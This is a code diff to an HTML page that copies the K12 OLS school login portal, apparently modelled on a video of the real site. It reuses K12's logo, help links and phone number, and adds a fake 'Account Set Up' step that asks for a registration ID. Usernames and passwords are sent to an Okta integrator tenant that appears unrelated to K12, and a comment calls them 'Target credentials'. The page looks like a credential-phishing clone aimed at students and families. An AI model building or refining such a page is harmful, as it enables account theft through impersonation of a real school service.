@@ -6,7 +6,7 @@
     <title>K12 OLS Login</title>
     
     <style>
-        /* Layout Structure to match the video exactly */
+        /* Layout Structure */
         html, body {
             margin: 0;
             padding: 0;
@@ -18,7 +18,7 @@
             overflow: hidden;
         }
 
-        /* Left Column: Login Form Panel */
+        /* Left Column: Login / Setup Panel */
         .login-column {
             width: 40%;
             min-width: 450px;
@@ -42,32 +42,39 @@
             background-position: center;
         }
 
-        /* K12 Brand Heading Style */
+        /* K12 Brand Heading Style with SVG Logo */
         .brand-header {
             width: 100%;
             max-width: 340px;
             text-align: left;
-            margin-bottom: 5px;
+            margin-bottom: 25px;
         }
-        .brand-header h1 {
-            color: #165ca3;
-            font-size: 46px;
-            margin: 0;
-            font-weight: bold;
-            font-style: italic;
-            letter-spacing: -1px;
+        .brand-header img {
+            height: 48px;
+            width: auto;
+            display: block;
         }
 
-        /* Pure HTML Form Structure styling matching K12 OLS */
-        .form-container {
+        /* Views Configuration toggles via JavaScript */
+        .view-panel {
             width: 100%;
             max-width: 340px;
-            margin-top: 15px;
+            display: none;
         }
+        .view-panel.active {
+            display: block;
+        }
+
         .form-title {
             font-size: 20px;
             font-weight: bold;
             color: #333333;
+            margin-bottom: 20px;
+        }
+        .form-subtitle {
+            font-size: 14px;
+            color: #666666;
+            line-height: 1.4;
             margin-bottom: 20px;
         }
         .input-group {
@@ -94,8 +101,8 @@
             border-color: #165ca3;
         }
 
-        /* Custom Login Button Styling matching the blue block in video */
-        .login-btn {
+        /* Form Button Styling */
+        .action-btn {
             width: 100%;
             padding: 12px;
             background-color: #1a73e8;
@@ -108,11 +115,11 @@
             margin-top: 10px;
             letter-spacing: 0.5px;
         }
-        .login-btn:hover {
+        .action-btn:hover {
             background-color: #155cb4;
         }
 
-        /* Help links area mimicking production footer links */
+        /* Sub-help and Dynamic View Switcher Links */
         .help-links {
             margin-top: 25px;
             font-size: 13px;
@@ -120,17 +127,23 @@
             width: 100%;
             max-width: 340px;
         }
+        .help-links p.section-label {
+            font-weight: bold;
+            color: #333333;
+            margin: 0 0 8px 0;
+        }
         .help-links a {
             color: #165ca3;
             text-decoration: none;
             display: block;
             margin-bottom: 8px;
+            cursor: pointer;
         }
         .help-links a:hover {
             text-decoration: underline;
         }
 
-        /* Success & Error Feedback Popups */
+        /* Success & Error Feedback Box Layouts */
         .message-box {
             padding: 15px;
             border-radius: 4px;
@@ -138,7 +151,6 @@
             margin-bottom: 15px;
             display: none;
             width: 100%;
-            max-width: 340px;
             box-sizing: border-box;
         }
         .error { background-color: #fce8e6; color: #c5221f; border: 1px solid #fad2cf; }
@@ -154,14 +166,14 @@
 
     <div class="login-column">
         <div class="brand-header">
-            <h1>K12</h1>
+            <img src="https://info-login.k12.com/common/img/k12-logo.svg" alt="K12 Logo">
         </div>
 
-        <div class="form-container">
+        <div id="login-view" class="view-panel active">
             <div class="form-title">Login</div>
             
-            <div id="error-alert" class="message-box error"></div>
-            <div id="success-alert" class="message-box success"></div>
+            <div id="login-error" class="message-box error"></div>
+            <div id="login-success" class="message-box success"></div>
 
             <div class="input-group">
                 <label for="username">Username</label>
@@ -173,14 +185,42 @@
                 <input type="password" id="password" autocomplete="current-password">
             </div>
 
-            <button type="button" class="login-btn" id="submit-btn">LOG IN</button>
+            <button type="button" class="action-btn" id="login-submit-btn">LOG IN</button>
+
+            <div class="help-links">
+                <p class="section-label">Need help logging in?</p>
+                <a href="#">Forgot Password?</a>
+                <a href="#">Request Registration ID</a>
+                <a href="#">Unlock Account</a>
+                <a href="#">Forgot Username?</a>
+                <a href="tel:866-512-2273">Call 866-512-2273</a>
+                <a href="#">K12 Customer Support</a>
+                
+                <hr style="border: 0; border-top: 1px solid #eee; margin: 20px 0;">
+                <p style="color:#666; font-size:12px; margin-bottom:5px;">Ready to set up your K12 School account?</p>
+                <a onclick="switchView('setup-view')" style="font-weight:bold;">Get Started</a>
+            </div>
         </div>
 
-        <div class="help-links">
-            <a href="#">Need help logging in?</a>
-            <hr style="border: 0; border-top: 1px solid #eee; margin: 20px 0;">
-            <p style="color:#666; font-size:12px; margin-bottom:5px;">Ready to set up your K12 School account?</p>
-            <a href="#" style="font-weight:bold;">Get Started</a>
+        <div id="setup-view" class="view-panel">
+            <div class="form-title">Account Set Up</div>
+            <div class="form-subtitle">Enter the K12 School registration ID that was sent to your email.</div>
+
+            <div id="setup-error" class="message-box error"></div>
+            <div id="setup-success" class="message-box success"></div>
+
+            <div class="input-group">
+                <label for="registration-id">Registration ID</label>
+                <input type="text" id="registration-id" placeholder="Enter Registration ID">
+            </div>
+
+            <button type="button" class="action-btn" id="setup-submit-btn">SUBMIT CODE</button>
+
+            <div class="help-links">
+                <a href="#">Need your Registration ID?</a>
+                <hr style="border: 0; border-top: 1px solid #eee; margin: 20px 0;">
+                <a onclick="switchView('login-view')" style="font-weight:bold;">Back to Login</a>
+            </div>
         </div>
     </div>
 
@@ -189,7 +229,15 @@
     <script src="https://global.oktacdn.com/okta-auth-js/7.2.0/okta-auth-js.min.js" type="text/javascript"></script>
 
     <script>
-        // Direct Authentication Configuration
+        // Global Navigation View Switcher Routine
+        function switchView(viewId) {
+            document.querySelectorAll('.view-panel').forEach(view => {
+                view.classList.remove('active');
+            });
+            document.getElementById(viewId).classList.add('active');
+        }
+
+        // Target credentials for active user validation pipelines
         const authClient = new OktaAuth({
             url: 'https://integrator-4230027.okta.com',
             clientId: '0oa13a39wvaIasHaV698',
@@ -198,13 +246,13 @@
             pkce: true
         });
 
-        document.getElementById('submit-btn').addEventListener('click', async () => {
+        // Handler Pipeline for Primary Sign In Form Action
+        document.getElementById('login-submit-btn').addEventListener('click', async () => {
             const usernameInput = document.getElementById('username').value;
             const passwordInput = document.getElementById('password').value;
-            const errorAlert = document.getElementById('error-alert');
-            const successAlert = document.getElementById('success-alert');
+            const errorAlert = document.getElementById('login-error');
+            const successAlert = document.getElementById('login-success');
 
-            // Reset alerts
             errorAlert.style.display = 'none';
             successAlert.style.display = 'none';
 
@@ -215,7 +263,6 @@
             }
 
             try {
-                // Background connection verification handler
                 const transaction = await authClient.signInWithCredentials({
                     username: usernameInput,
                     password: passwordInput
@@ -224,16 +271,37 @@
                 if (transaction.status === 'SUCCESS') {
                     successAlert.textContent = "Success! Authentication handshake completed.";
                     successAlert.style.display = 'block';
-                    console.log('Session Token:', transaction.sessionToken);
+                    console.log('Session Token Authorized:', transaction.sessionToken);
                 } else {
-                    errorAlert.textContent = `Status context: ${transaction.status}`;
+                    errorAlert.textContent = `Status verification state context returned: ${transaction.status}`;
                     errorAlert.style.display = 'block';
                 }
             } catch (err) {
                 console.error(err);
-                errorAlert.textContent = err.message || "Authentication rejected.";
+                errorAlert.textContent = err.message || "Authentication credentials rejected.";
                 errorAlert.style.display = 'block';
             }
+        });
+
+        // Handler Pipeline for Okta Self-Registration Verification ID Form Action
+        document.getElementById('setup-submit-btn').addEventListener('click', () => {
+            const registrationCode = document.getElementById('registration-id').value;
+            const errorAlert = document.getElementById('setup-error');
+            const successAlert = document.getElementById('setup-success');
+
+            errorAlert.style.display = 'none';
+            successAlert.style.display = 'none';
+
+            if (!registrationCode) {
+                errorAlert.textContent = "Please enter your valid Registration ID tracking string to proceed.";
+                errorAlert.style.display = 'block';
+                return;
+            }
+
+            // Diagnostic feedback to verify processing logic loop functions normally
+            console.log("Registration enrollment verification initialized with target validation ID code:", registrationCode);
+            successAlert.textContent = "Code received. Connecting to your profile directory data entry token path...";
+            successAlert.style.display = 'block';
         });
     </script>
 </body>
